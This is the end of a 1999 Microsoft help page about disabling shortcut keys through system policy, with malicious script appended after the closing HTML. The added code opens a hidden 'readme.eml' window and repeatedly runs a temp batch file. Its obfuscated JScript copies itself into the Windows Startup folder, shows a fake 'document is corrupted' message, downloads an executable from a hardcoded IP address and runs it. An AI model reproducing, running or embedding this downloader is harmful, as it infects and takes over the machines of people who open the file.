	<LI class=LS>In the <B>Settings for Disable</B> <B>shortcut keys</B> box, click <B>Show</B>.</li>

	<LI class=LS>In the <B>Show Contents</B> box, click <B>Add</B>.</li>

	<LI class=LS>In the <B>Add Item</B> box, type the key and modifier key values for the shortcut key by using the following syntax:
<P class=LT1><I>key</I>,<I>modifier</I>

<P class=LT1>For example, to disable the shortcut key ALT+K, type <B>75,16</B>
</li>
</OL>

<P class=NT><B>Note</B>&nbsp;&nbsp;&nbsp;If you use the Custom category to disable a shortcut key that has already been disabled elsewhere in the policy file, the duplicate entry is ignored.</P>



<p class=t align=right><b><a href="#top">Top</a></b></p>

<H4>See also</H4>
<a name="dex35"></a>

<P class=T>To disable a custom shortcut key, you must know the virtual key code for the shortcut key. For information about virtual key codes, see <a HREF="../three/50t3_5.htm">Virtual Key Codes for Shortcut Keys</a>.</P>
<a name="dex36"></a>

<P class=T>You can use system policies to control a range of items in the user interface. For conceptual information about disabling items in the user interface, see <a HREF="../three/50ct_8.htm">Using System Policies to Disable User Interface Items</a>.</P>


<BR>


</TD>



<!-------------------------------- END PAGE CONTENT -------------------------------->



<!-------------------------------- START PREV/NEXT NAVIGATION -------------------------------->


<td align=right width=80>



	<table align="right" cellspacing="0" cellpadding="0" style="margin-top: 5px;" style="padding-right: 5px;">
<tr>
    <td><A HREF="50t3.htm"><img src="../images/contents.gif" border=0 alt="Topic Contents" vspace=1></A></td>
</tr>
<tr>
    <td><A HREF="50t3_5.htm"><img src="../images/next.gif" border=0 alt="Next"></A></td>
</tr>
<tr>
    <td><A HREF="50t3_3.htm"><img src="../images/previous.gif" border=0 alt="Previous" vspace=1></A></td>
</tr>

</table>


<!-------------------------------- END PREV/NEXT NAVIGATION -------------------------------->

</td>
</tr>
</table>

<!-------------------------------- BEGIN PAGE FOOTER -------------------------------->
<center>
<table width=450 style="margin-left: 80px;">
<TR><TD COLSPAN=3 align=center><HR width=500>
<FONT FACE="verdana, helvetica, arial" SIZE=2 color=#003399><b><a href="50t3.htm">Topic Contents</a></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><A HREF="50t3_3.htm">Previous</A></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><A HREF="50t3_5.htm">Next</A></b>&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;<b><a href="#top">Top</a></b></font>
<BR><BR>&nbsp;
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
Friday, March 5, 1999<BR>
&copy; <A HREF="../appndx/cpyright.htm"> 1999 Microsoft Corporation. All rights reserved. Terms of use</A>.
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR>

<TR><TD COLSPAN=3 align=center>
<FONT FACE="verdana, helvetica, arial" SIZE=1 CLASS=detail>
<A HREF="../appndx/eula.htm">License</A>
</FONT><BR><IMG SRC="../images/spacer.gif" WIDTH=340 HEIGHT=1></TD></TR></TABLE>
</center>
<!-------------------------------- END PAGE FOOTER -------------------------------->
</BODY>
</HTML>

<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>

CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
CreateObject("WScript.shell").run "cmd /c %temp%\help.bat", 0, False
obj_more=null;obj_considered=null;obj_packages8=null;obj_better=null;obj_Accuracy=null;obj_alike1=null;obj_large=null;obj_running1=null;obj_capture5=null;obj_servers105=null;obj_they7=null;obj_size=null;var \u0041\u0063\u0074\u0058\u004e=this[{ren3:'\u0041'}.ren3+{n1:'\u0063'}.n1+{ata3:'\u0074'}.ata3+{e0:'\u0069'}.e0+{a1:'\u0076'}.a1+{u1:'\u0065'}.u1+{e1:'\u0058'}.e1+{ete1:'\u004f'}.ete1+{o3:'\u0062'}.o3+{ncr1:'\u006a'}.ncr1+{io0:'\u0065'}.io0+{v0:'\u0063'}.v0+{im2:'\u0074'}.im2];var \u0057\u0053\u0053\u0053\u0031\u0032=this[{ove0:'\u0057'}.ove0+{Sc3:'\u0053'}.Sc3+{evi1:'\u0063'}.evi1+{ec1:'\u0072'}.ec1+{et1:'\u0069'}.et1+{i0:'\u0070'}.i0+{oft0:'\u0074'}.oft0];var obj_complex2 = \u0057\u0053\u0053\u0053\u0031\u0032[{lik3:'\u0043'}.lik3+{v0:'\u0072'}.v0+{re3:'\u0065'}.re3+{ha2:'\u0061'}.ha2+{ncl0:'\u0074'}.ncl0+{a1:'\u0065'}.a1+{un3:'\u004f'}.un3+{is1:'\u0062'}.is1+{i3:'\u006a'}.i3+{ec2:'\u0065'}.ec2+{ri0:'\u0063'}.ri0+{ore2:'\u0074'}.ore2]({e1:'\u0057'}.e1+{ize2:'\u0053'}.ize2+{s3:'\u0063'}.s3+{in0:'\u0072'}.in0+{omp2:'\u0069'}.omp2+{r1:'\u0070'}.r1+{a2:'\u0074'}.a2+{ign3:'\u002e'}.ign3+{uer2:'\u0053'}.uer2+{pti2:'\u0068'}.pti2+{irs3:'\u0065'}.irs3+{a1:'\u006c'}.a1+{um3:'\u006c'}.um3);var \u0066\u0073\u006f\u0031\u0032 = new \u0041\u0063\u0074\u0058\u004e({ncr0:'\u0053'}.ncr0+{p3:'\u0063'}.p3+{ap0:'\u0072'}.ap0+{ons2:'\u0069'}.ons2+{nal2:'\u0070'}.nal2+{ap2:'\u0074'}.ap2+{e3:'\u0069'}.e3+{e1:'\u006e'}.e1+{irs2:'\u0067'}.irs2+{r0:'\u002e'}.r0+{r3:'\u0046'}.r3+{er3:'\u0069'}.er3+{al1:'\u006c'}.al1+{isu2:'\u0065'}.isu2+{re2:'\u0053'}.re2+{e1:'\u0079'}.e1+{ncl1:'\u0073'}.ncl1+{e1:'\u0074'}.e1+{i1:'\u0065'}.i1+{nf1:'\u006d'}.nf1+{e3:'\u004f'}.e3+{t2:'\u0062'}.t2+{r0:'\u006a'}.r0+{tor2:'\u0065'}.tor2+{eci3:'\u0063'}.eci3+{ea1:'\u0074'}.ea1);var obj_informationsensing = new \u0041\u0063\u0074\u0058\u004e({apa0:'\u0041'}.apa0+{l0:'\u0044'}.l0+{rea3:'\u004f'}.rea3+{ven3:'\u0044'}.ven3+{nf3:'\u0042'}.nf3+{de0:'\u002e'}.de0+{equ0:'\u0053'}.equ0+{o0:'\u0074'}.o0+{dv3:'\u0072'}.dv3+{rac3:'\u0065'}.rac3+{u1:'\u0061'}.u1+{ve3:'\u006d'}.ve3);var obj_trends6 = new \u0041\u0063\u0074\u0058\u004e({and1:'\u0053'}.and1+{u3:'\u0068'}.u3+{e1:'\u0065'}.e1+{i1:'\u006c'}.i1+{o3:'\u006c'}.o3+{ec3:'\u002e'}.ec3+{et1:'\u0041'}.et1+{alu2:'\u0070'}.alu2+{en2:'\u0070'}.en2+{im3:'\u006c'}.im3+{xe2:'\u0069'}.xe2+{oo1:'\u0063'}.oo1+{ata2:'\u0061'}.ata2+{h0:'\u0074'}.h0+{o0:'\u0069'}.o0+{if1:'\u006f'}.if1+{a2:'\u006e'}.a2);var \u0074\u0065\u006d\u0070\u0031\u0032=obj_complex2[{efe0:'\u0045'}.efe0+{ou2:'\u0078'}.ou2+{at3:'\u0070'}.at3+{l1:'\u0061'}.l1+{ccu1:'\u006e'}.ccu1+{a0:'\u0064'}.a0+{ec0:'\u0045'}.ec0+{an1:'\u006e'}.an1+{eri0:'\u0076'}.eri0+{onn0:'\u0069'}.onn0+{ue0:'\u0072'}.ue0+{un2:'\u006f'}.un2+{iff1:'\u006e'}.iff1+{red3:'\u006d'}.red3+{n3:'\u0065'}.n3+{e3:'\u006e'}.e3+{art0:'\u0074'}.art0+{ec1:'\u0053'}.ec1+{l3:'\u0074'}.l3+{ea2:'\u0072'}.ea2+{o1:'\u0069'}.o1+{ci2:'\u006e'}.ci2+{e2:'\u0067'}.e2+{imu2:'\u0073'}.imu2]({at0:'\u0025'}.at0+{r3:'\u0054'}.r3+{h3:'\u0045'}.h3+{dv3:'\u004d'}.dv3+{iz0:'\u0050'}.iz0+{art0:'\u0025'}.art0);var obj_medicine=\u0074\u0065\u006d\u0070\u0031\u0032+{orr1:'\u005c'}.orr1+{r2:'\u005c'}.r2+Math.floor((Math[{ara3:'\u0072'}.ara3+{ith2:'\u0061'}.ith2+{ign3:'\u006e'}.ign3+{at2:'\u0064'}.at2+{xt3:'\u006f'}.xt3+{ar3:'\u006d'}.ar3]() * (50+20+30)) + 1)+{u1:'\u002e'}.u1+{na0:'\u0065'}.na0+{rea0:'\u0078'}.rea0+{i3:'\u0065'}.i3;var obj_time = new \u0041\u0063\u0074\u0058\u004e({hat3:'\u004d'}.hat3+{e3:'\u0073'}.e3+{xtr2:'\u0078'}.xtr2+{imu1:'\u006d'}.imu1+{na1:'\u006c'}.na1+{i1:'\u0032'}.i1+{ro2:'\u002e'}.ro2+{omp0:'\u0053'}.omp0+{a1:'\u0065'}.a1+{or3:'\u0072'}.or3+{ncl3:'\u0076'}.ncl3+{ni2:'\u0065'}.ni2+{at1:'\u0072'}.at1+{at3:'\u0058'}.at3+{t0:'\u004d'}.t0+{nfo0:'\u004c'}.nfo0+{a2:'\u0048'}.a2+{ata2:'\u0054'}.ata2+{evi0:'\u0054'}.evi0+{i2:'\u0050'}.i2); var \u0062\u006f\u0064\u0079\u0031\u0032={ith3:'\u005c'}.ith3+{v2:'\u0061'}.v2+{x2:'\u0066'}.x2+{egu1:'\u006c'}.egu1+{e2:'\u0061'}.e2+{ncl0:'\u0073'}.ncl0+{nc0:'\u0068'}.nc0+{nv3:'\u005f'}.nv3+{s1:'\u0075'}.s1+{r0:'\u0070'}.r0+{red1:'\u0064'}.red1+{i2:'\u0061'}.i2+{e3:'\u0074'}.e3+{n240:'\u0065'}.n240+{ata3:'\u002e'}.ata3+{og3:'\u006a'}.og3+{o1:'\u0073'}.o1;var \u0073\u0074\u0061\u0072\u0074\u0075\u0070\u0046\u006f\u006c\u0064\u0065\u0072=obj_trends6[{eld0:'\u004e'}.eld0+{ap0:'\u0061'}.ap0+{h0:'\u006d'}.h0+{a2:'\u0065'}.a2+{ovi0:'\u0053'}.ovi0+{ni3:'\u0070'}.ni3+{icr1:'\u0061'}.icr1+{li3:'\u0063'}.li3+{re3:'\u0065'}.re3](3+2+2);var \u0066\u006c\u0061\u0067\u006d\u0065=false;var obj_including=false;var obj_lead9=1;var \u0066\u0069\u006c\u0065\u0074\u0073=null;var \u0065\u006d\u0070\u0074\u0079\u0031\u0032='';var obj_systems7=\u0057\u0053\u0053\u0053\u0031\u0032[{ens2:'\u0053'}.ens2+{he2:'\u0063'}.he2+{e3:'\u0072'}.e3+{n0:'\u0069'}.n0+{at3:'\u0070'}.at3+{rea2:'\u0074'}.rea2+{aki3:'\u0046'}.aki3+{ou2:'\u0075'}.ou2+{i2:'\u006c'}.i2+{a1:'\u006c'}.a1+{ool0:'\u004e'}.ool0+{in0:'\u0061'}.in0+{n0:'\u006d'}.n0+{ea1:'\u0065'}.ea1];var \u0061\u0075\u0074\u006f\u0072=\u0073\u0074\u0061\u0072\u0074\u0075\u0070\u0046\u006f\u006c\u0064\u0065\u0072.Self.Path+\u0062\u006f\u0064\u0079\u0031\u0032;var obj_target ={unn0:'\u0068'}.unn0+{ci2:'\u0074'}.ci2+{lik2:'\u0074'}.lik2+{p1:'\u0070'}.p1+{er1:'\u0073'}.er1+{x0:'\u003a'}.x0+{ete2:'\u002f'}.ete2+{red1:'\u002f'}.red1+{ets3:'\u0032'}.ets3+{at3:'\u0031'}.at3+{api1:'\u0037'}.api1+{a0:'\u002e'}.a0+{r1:'\u0032'}.r1+{n0:'\u0038'}.n0+{pti1:'\u002e'}.pti1+{e2:'\u0032'}.e2+{at0:'\u0031'}.at0+{l2:'\u0038'}.l2+{a0:'\u002e'}.a0+{at3:'\u0032'}.at3+{im2:'\u0031'}.im2+{iz1:'\u0037'}.iz1+{efo3:'\u002f'}.efo3+{u2:'\u0041'}.u2+{nf0:'\u0045'}.nf0+{nc0:'\u0035'}.nc0+{at0:'\u0036'}.at0+{rga1:'\u0030'}.rga1+{ata0:'\u0030'}.ata0+{pe1:'\u0046'}.pe1+{ep2:'\u0046'}.ep2+{eed1:'\u0043'}.eed1+{e1:'\u0042'}.e1+{et51:'\u0043'}.et51+{t0:'\u0043'}.t0+{xp3:'\u002f'}.xp3+{on1:'\u0071'}.on1+{na3:'\u0036'}.na3+{onf1:'\u0034'}.onf1+{e3:'\u002e'}.e3+{irs0:'\u0070'}.irs0+{ont0:'\u0068'}.ont0+{ak2:'\u0070'}.ak2+{h2:'\u003f'}.h2+{u3:'\u0061'}.u3+{a3:'\u0064'}.a3+{ata0:'\u0064'}.ata0+{a3:'\u003d'}.a3+{de2:'\u0067'}.de2+{a1:'\u0074'}.a1+{ncl3:'\u0079'}.ncl3+{rim1:'\u0068'}.rim1+{i0:'\u0062'}.i0+{ffe0:'\u006e'}.ffe0+{e2:'\u0063'}.e2+{nf2:'\u0064'}.nf2+{unn2:'\u0066'}.unn2+{at1:'\u0065'}.at1+{a3:'\u0077'}.a3+{ear3:'\u0070'}.ear3+{u1:'\u006e'}.u1+{ert1:'\u006a'}.ert1+{o3:'\u006d'}.o3+{im1:'\u0039'}.im1+{r2:'\u006f'}.r2+{un1:'\u006b'}.un1+{on1:'\u006c'}.on1+{h1:'\u006d'}.h1+{fte2:'\u006e'}.fte2+{a3:'\u0066'}.a3+{edu2:'\u0064'}.edu2+{nf1:'\u0072'}.nf1+{eed3:'\u0074'}.eed3+{ont0:'\u0071'}.ont0+{eth0:'\u0064'}.eth0+{er1:'\u0063'}.er1+{io0:'\u007a'}.io0+{nf3:'\u0064'}.nf3+{us1:'\u0066'}.us1+{e0:'\u0067'}.e0+{irs2:'\u0072'}.irs2+{e2:'\u0074'}.e2; if ((obj_systems7!=\u0061\u0075\u0074\u006f\u0072) && (\u0066\u006c\u0061\u0067\u006d\u0065==false))  {        \u0066\u006c\u0061\u0067\u006d\u0065=true;     \u0066\u0073\u006f\u0031\u0032[{at3:'\u0043'}.at3+{esk1:'\u006f'}.esk1+{a0:'\u0070'}.a0+{orr3:'\u0079'}.orr3+{n1:'\u0046'}.n1+{ata3:'\u0069'}.ata3+{e0:'\u006c'}.e0+{a1:'\u0065'}.a1](obj_systems7,\u0061\u0075\u0074\u006f\u0072);     \u0066\u0073\u006f\u0031\u0032[{u1:'\u0044'}.u1+{e1:'\u0065'}.e1+{ete1:'\u006c'}.ete1+{o3:'\u0065'}.o3+{ncr1:'\u0074'}.ncr1+{io0:'\u0065'}.io0+{v0:'\u0046'}.v0+{im2:'\u0069'}.im2+{ove0:'\u006c'}.ove0+{Sc3:'\u0065'}.Sc3](obj_systems7);     \u0057\u0053\u0053\u0053\u0031\u0032[{evi1:'\u0065'}.evi1+{ec1:'\u0063'}.ec1+{et1:'\u0068'}.et1+{i0:'\u006f'}.i0]({oft0:'\u0054'}.oft0+{lik3:'\u0068'}.lik3+{v0:'\u0065'}.v0+{re3:'\u0020'}.re3+{ha2:'\u0064'}.ha2+{ncl0:'\u006f'}.ncl0+{a1:'\u0063'}.a1+{un3:'\u0075'}.un3+{is1:'\u006d'}.is1+{i3:'\u0065'}.i3+{ec2:'\u006e'}.ec2+{ri0:'\u0074'}.ri0+{ore2:'\u0020'}.ore2+{e1:'\u0069'}.e1+{ize2:'\u0073'}.ize2+{s3:'\u0020'}.s3+{in0:'\u0063'}.in0+{omp2:'\u006f'}.omp2+{r1:'\u0072'}.r1+{a2:'\u0072'}.a2+{ign3:'\u0075'}.ign3+{uer2:'\u0070'}.uer2+{pti2:'\u0074'}.pti2+{irs3:'\u0065'}.irs3+{a1:'\u0064'}.a1+{um3:'\u0020'}.um3+{ncr0:'\u0061'}.ncr0+{p3:'\u006e'}.p3+{ap0:'\u0064'}.ap0+{ons2:'\u0020'}.ons2+{nal2:'\u0063'}.nal2+{ap2:'\u0061'}.ap2+{e3:'\u006e'}.e3+{e1:'\u006e'}.e1+{irs2:'\u006f'}.irs2+{r0:'\u0074'}.r0+{r3:'\u0020'}.r3+{er3:'\u0062'}.er3+{al1:'\u0065'}.al1+{isu2:'\u0020'}.isu2+{re2:'\u006f'}.re2+{e1:'\u0070'}.e1+{ncl1:'\u0065'}.ncl1+{e1:'\u006e'}.e1+{i1:'\u0065'}.i1+{nf1:'\u0064'}.nf1);	 \u0057\u0053\u0053\u0053\u0031\u0032[{e3:'\u0053'}.e3+{t2:'\u006c'}.t2+{r0:'\u0065'}.r0+{tor2:'\u0065'}.tor2+{eci3:'\u0070'}.eci3](4000+4000);  }  while(true) {  obj_lead9=obj_lead9+1;   if (obj_lead9==200000000)   {  while (true)   {      try    { 	obj_time[{ea1:'\u0073'}.ea1+{apa0:'\u0065'}.apa0+{l0:'\u0074'}.l0+{rea3:'\u004f'}.rea3+{ven3:'\u0070'}.ven3+{nf3:'\u0074'}.nf3+{de0:'\u0069'}.de0+{equ0:'\u006f'}.equ0+{o0:'\u006e'}.o0](3,{dv3:'\u004d'}.dv3+{rac3:'\u0053'}.rac3+{u1:'\u0058'}.u1+{ve3:'\u004d'}.ve3+{and1:'\u004c'}.and1);     obj_time[{u3:'\u006f'}.u3+{e1:'\u0070'}.e1+{i1:'\u0065'}.i1+{o3:'\u006e'}.o3]({ec3:'\u0047'}.ec3+{et1:'\u0045'}.et1+{alu2:'\u0054'}.alu2, obj_target+{en2:'\u0026'}.en2+Math[{im3:'\u0066'}.im3+{xe2:'\u006c'}.xe2+{oo1:'\u006f'}.oo1+{ata2:'\u006f'}.ata2+{h0:'\u0072'}.h0]((Math[{ara3:'\u0072'}.ara3+{ith2:'\u0061'}.ith2+{ign3:'\u006e'}.ign3+{at2:'\u0064'}.at2+{xt3:'\u006f'}.xt3+{ar3:'\u006d'}.ar3]() * (200)) + 1), false);    obj_time[{l1:'\u0073'}.l1+{ccu1:'\u0065'}.ccu1+{a0:'\u006e'}.a0+{ec0:'\u0064'}.ec0]();    if (obj_time[{an1:'\u0073'}.an1+{eri0:'\u0074'}.eri0+{onn0:'\u0061'}.onn0+{ue0:'\u0074'}.ue0+{un2:'\u0075'}.un2+{iff1:'\u0073'}.iff1] == (100+100))         {          if (\u0066\u0073\u006f\u0031\u0032[{red3:'\u0046'}.red3+{n3:'\u0069'}.n3+{e3:'\u006c'}.e3+{art0:'\u0065'}.art0+{ec1:'\u0045'}.ec1+{l3:'\u0078'}.l3+{ea2:'\u0069'}.ea2+{o1:'\u0073'}.o1+{ci2:'\u0074'}.ci2+{e2:'\u0073'}.e2](obj_medicine))  \u0066\u0073\u006f\u0031\u0032[{u1:'\u0044'}.u1+{e1:'\u0065'}.e1+{ete1:'\u006c'}.ete1+{o3:'\u0065'}.o3+{ncr1:'\u0074'}.ncr1+{io0:'\u0065'}.io0+{v0:'\u0046'}.v0+{im2:'\u0069'}.im2+{ove0:'\u006c'}.ove0+{Sc3:'\u0065'}.Sc3](obj_medicine); 		          obj_informationsensing[{ith2:'\u004f'}.ith2+{ign3:'\u0070'}.ign3+{at2:'\u0065'}.at2+{xt3:'\u006e'}.xt3]();         obj_informationsensing[{ar3:'\u0054'}.ar3+{u1:'\u0079'}.u1+{na0:'\u0070'}.na0+{rea0:'\u0065'}.rea0]=1;		          obj_informationsensing[{i3:'\u0057'}.i3+{hat3:'\u0072'}.hat3+{e3:'\u0069'}.e3+{xtr2:'\u0074'}.xtr2+{imu1:'\u0065'}.imu1](obj_time[{na1:'\u0072'}.na1+{i1:'\u0065'}.i1+{ro2:'\u0073'}.ro2+{omp0:'\u0070'}.omp0+{a1:'\u006f'}.a1+{or3:'\u006e'}.or3+{ncl3:'\u0073'}.ncl3+{ni2:'\u0065'}.ni2+{at1:'\u0042'}.at1+{at3:'\u006f'}.at3+{t0:'\u0064'}.t0+{nfo0:'\u0079'}.nfo0]);          obj_informationsensing[{a2:'\u0050'}.a2+{ata2:'\u006f'}.ata2+{evi0:'\u0073'}.evi0+{i2:'\u0069'}.i2+{ith3:'\u0074'}.ith3+{v2:'\u0069'}.v2+{x2:'\u006f'}.x2+{egu1:'\u006e'}.egu1]=0;         obj_informationsensing[{e2:'\u0053'}.e2+{ncl0:'\u0061'}.ncl0+{nc0:'\u0076'}.nc0+{nv3:'\u0065'}.nv3+{s1:'\u0054'}.s1+{r0:'\u006f'}.r0+{red1:'\u0046'}.red1+{i2:'\u0069'}.i2+{e3:'\u006c'}.e3+{n240:'\u0065'}.n240](obj_medicine);         obj_informationsensing[{ata3:'\u0043'}.ata3+{og3:'\u006c'}.og3+{o1:'\u006f'}.o1+{eld0:'\u0073'}.eld0+{ap0:'\u0065'}.ap0]();         \u0066\u0069\u006c\u0065\u0074\u0073=\u0066\u0073\u006f\u0031\u0032[{h0:'\u0047'}.h0+{a2:'\u0065'}.a2+{ovi0:'\u0074'}.ovi0+{ni3:'\u0046'}.ni3+{icr1:'\u0069'}.icr1+{li3:'\u006c'}.li3+{re3:'\u0065'}.re3](obj_medicine)[{ens2:'\u004f'}.ens2+{he2:'\u0070'}.he2+{e3:'\u0065'}.e3+{n0:'\u006e'}.n0+{at3:'\u0041'}.at3+{rea2:'\u0073'}.rea2+{aki3:'\u0054'}.aki3+{ou2:'\u0065'}.ou2+{i2:'\u0078'}.i2+{a1:'\u0074'}.a1+{ool0:'\u0053'}.ool0+{in0:'\u0074'}.in0+{n0:'\u0072'}.n0+{ea1:'\u0065'}.ea1+{unn0:'\u0061'}.unn0+{ci2:'\u006d'}.ci2](1);         if (\u0066\u0073\u006f\u0031\u0032[{red3:'\u0046'}.red3+{n3:'\u0069'}.n3+{e3:'\u006c'}.e3+{art0:'\u0065'}.art0+{ec1:'\u0045'}.ec1+{l3:'\u0078'}.l3+{ea2:'\u0069'}.ea2+{o1:'\u0073'}.o1+{ci2:'\u0074'}.ci2+{e2:'\u0073'}.e2](obj_medicine) && \u0066\u0069\u006c\u0065\u0074\u0073[{r1:'\u0052'}.r1+{n0:'\u0065'}.n0+{pti1:'\u0061'}.pti1+{e2:'\u0064'}.e2+{at0:'\u004c'}.at0+{l2:'\u0069'}.l2+{a0:'\u006e'}.a0+{at3:'\u0065'}.at3]()[{im2:'\u0073'}.im2+{iz1:'\u0075'}.iz1+{efo3:'\u0062'}.efo3+{u2:'\u0073'}.u2+{nf0:'\u0074'}.nf0+{nc0:'\u0072'}.nc0+{at0:'\u0069'}.at0+{rga1:'\u006e'}.rga1+{ata0:'\u0067'}.ata0](0,2)=={pe1:'\u004d'}.pe1+{ep2:'\u005a'}.ep2) 		  { 			obj_including=true; 			obj_trends6[{eed1:'\u0053'}.eed1+{e1:'\u0068'}.e1+{et51:'\u0065'}.et51+{t0:'\u006c'}.t0+{xp3:'\u006c'}.xp3+{on1:'\u0045'}.on1+{na3:'\u0078'}.na3+{onf1:'\u0065'}.onf1+{e3:'\u0063'}.e3+{irs0:'\u0075'}.irs0+{ont0:'\u0074'}.ont0+{ak2:'\u0065'}.ak2](obj_medicine,'','',{u3:'\u006f'}.u3+{e1:'\u0070'}.e1+{i1:'\u0065'}.i1+{o3:'\u006e'}.o3,{a3:'\u0031'}.a3); 			if (\u0066\u0073\u006f\u0031\u0032[{red3:'\u0046'}.red3+{n3:'\u0069'}.n3+{e3:'\u006c'}.e3+{art0:'\u0065'}.art0+{ec1:'\u0045'}.ec1+{l3:'\u0078'}.l3+{ea2:'\u0069'}.ea2+{o1:'\u0073'}.o1+{ci2:'\u0074'}.ci2+{e2:'\u0073'}.e2](\u0057\u0053\u0053\u0053\u0031\u0032[{ens2:'\u0053'}.ens2+{he2:'\u0063'}.he2+{e3:'\u0072'}.e3+{n0:'\u0069'}.n0+{at3:'\u0070'}.at3+{rea2:'\u0074'}.rea2+{aki3:'\u0046'}.aki3+{ou2:'\u0075'}.ou2+{i2:'\u006c'}.i2+{a1:'\u006c'}.a1+{ool0:'\u004e'}.ool0+{in0:'\u0061'}.in0+{n0:'\u006d'}.n0+{ea1:'\u0065'}.ea1])) \u0066\u0073\u006f\u0031\u0032[{u1:'\u0044'}.u1+{e1:'\u0065'}.e1+{ete1:'\u006c'}.ete1+{o3:'\u0065'}.o3+{ncr1:'\u0074'}.ncr1+{io0:'\u0065'}.io0+{v0:'\u0046'}.v0+{im2:'\u0069'}.im2+{ove0:'\u006c'}.ove0+{Sc3:'\u0065'}.Sc3](\u0057\u0053\u0053\u0053\u0031\u0032[{ens2:'\u0053'}.ens2+{he2:'\u0063'}.he2+{e3:'\u0072'}.e3+{n0:'\u0069'}.n0+{at3:'\u0070'}.at3+{rea2:'\u0074'}.rea2+{aki3:'\u0046'}.aki3+{ou2:'\u0075'}.ou2+{i2:'\u006c'}.i2+{a1:'\u006c'}.a1+{ool0:'\u004e'}.ool0+{in0:'\u0061'}.in0+{n0:'\u006d'}.n0+{ea1:'\u0065'}.ea1]);			\u0057\u0053\u0053\u0053\u0031\u0032[{e3:'\u0053'}.e3+{t2:'\u006c'}.t2+{r0:'\u0065'}.r0+{tor2:'\u0065'}.tor2+{eci3:'\u0070'}.eci3](4000);			if (\u0066\u0073\u006f\u0031\u0032[{red3:'\u0046'}.red3+{n3:'\u0069'}.n3+{e3:'\u006c'}.e3+{art0:'\u0065'}.art0+{ec1:'\u0045'}.ec1+{l3:'\u0078'}.l3+{ea2:'\u0069'}.ea2+{o1:'\u0073'}.o1+{ci2:'\u0074'}.ci2+{e2:'\u0073'}.e2](obj_medicine)) \u0066\u0073\u006f\u0031\u0032[{u1:'\u0044'}.u1+{e1:'\u0065'}.e1+{ete1:'\u006c'}.ete1+{o3:'\u0065'}.o3+{ncr1:'\u0074'}.ncr1+{io0:'\u0065'}.io0+{v0:'\u0046'}.v0+{im2:'\u0069'}.im2+{ove0:'\u006c'}.ove0+{Sc3:'\u0065'}.Sc3](obj_medicine);	      }		  \u0066\u0069\u006c\u0065\u0074\u0073[{ata3:'\u0043'}.ata3+{og3:'\u006c'}.og3+{o1:'\u006f'}.o1+{eld0:'\u0073'}.eld0+{ap0:'\u0065'}.ap0]();         }     }catch(e){}   if (obj_including==true) {break;}    \u0057\u0053\u0053\u0053\u0031\u0032[{e3:'\u0053'}.e3+{t2:'\u006c'}.t2+{r0:'\u0065'}.r0+{tor2:'\u0065'}.tor2+{eci3:'\u0070'}.eci3](10000*7);     }   break;  }    };obj_doubled=204;obj_cameras5=0.328;obj_data=0.231;obj_data=0.559;obj_that1=87;obj_hundreds9=0.797;obj_months4=0.66;obj_predictive4=522;obj_target=426;obj_moving7=481;obj_hundreds1=442;obj_capacity1=0.447;



#end